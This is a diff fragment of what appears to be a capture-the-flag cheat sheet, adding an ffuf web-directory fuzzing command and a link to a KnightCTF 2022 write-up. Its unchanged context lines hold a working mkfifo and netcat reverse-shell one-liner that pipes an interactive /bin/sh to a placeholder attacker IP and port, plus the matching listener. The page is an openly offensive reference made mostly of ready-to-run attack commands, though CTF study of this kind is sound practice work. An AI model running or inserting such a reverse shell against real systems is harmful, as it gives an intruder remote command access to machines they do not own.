@@ -195,6 +195,15 @@ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your_ip] [nc_port] >/tmp
 exploit:
 ```
 nc -lnvp [port]
+```
+ffuf
+```bash
+ffuf -u http://[link]/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fs [stop this request num]
+
+
 
 resources:
 [^1]:https://github.com/digital-overdose/ctf-writeups/edit/main/2022-KNIGHT_CTF/ALPHABET_KNOCK_CODE.md
+
+
+
